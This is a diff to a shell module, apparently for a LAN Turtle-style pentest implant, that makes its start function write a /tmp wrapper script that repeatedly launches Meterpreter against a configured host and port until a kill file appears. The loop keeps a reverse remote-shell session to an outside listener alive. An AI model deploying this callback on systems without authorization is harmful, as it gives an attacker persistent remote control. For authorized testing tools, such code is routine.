@@ -10,23 +10,47 @@ CONF=/tmp/meterpreter.form
 : ${DIALOG_ESC=255}
 
 function start {
-  if [ -s /etc/config/meterpreter ]
+ if [ -s /etc/config/meterpreter ]
   then
-    echo "/etc/turtle/meterpreter/executable" | at now
-    echo "Meterpreter started with pid:"
+    rm /tmp/meterpreter_exec
+    touch /tmp/meterpreter_exec
+    chmod +x /tmp/meterpreter_exec
+
+    echo '''#!/bin/bash
+    rm /tmp/killmeterpreter
+    DATE=$(date)
+    IP=$(uci get meterpreter.host)
+    PORT=$(uci get meterpreter.port)
+    DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+    [[ "$IP" == "" || "$PORT" == "" ]] && {
+    logger "Meterpreter: Error, configuration blank"
+    echo "Meterpreter: Error, configuration blank"
+    } || {
+    while [ ! -f /tmp/killmeterpreter ]; do
+    echo "Started Meterpreter at $DATE with $IP $PORT"
+    logger "Meterpreter: Started at $DATE with $IP $PORT"
+    /usr/bin/meterpreter $IP $PORT
+    done
+    rm /tmp/killmeterpreter
+    echo "Stopped Meterpreter at $DATE with $IP $PORT"
+    logger "Meterpreter: Stopped at $DATE with $IP $PORT"
+    }''' > /tmp/meterpreter_exec
+
+    echo "/tmp/meterpreter_exec" | at now
+    echo "Stageless Meterpreter started with pid:"
     pidof meterpreter
-  else
+ else
     echo "Meterpreter not configured"
   fi
 }
 
 function stop {
   touch /tmp/killmeterpreter
-  kill $(ps | grep [/]usr/bin/meterpreter | awk {'print $1'})
+  kill $(ps | grep -w [/]usr/bin/meterpreter | awk {'print $1'})
 }
 
 function status {
-  if ps | grep -q [/]usr/bin/meterpreter; then echo "1"; else echo "0"; fi
+  if ps | grep -w -q [/]usr/bin/meterpreter; then echo "1"; else echo "0"; fi
 }
 
 function configure {
@@ -104,4 +128,3 @@ sessions -i [number]                    \n\
       clear;;
   esac
 }
-
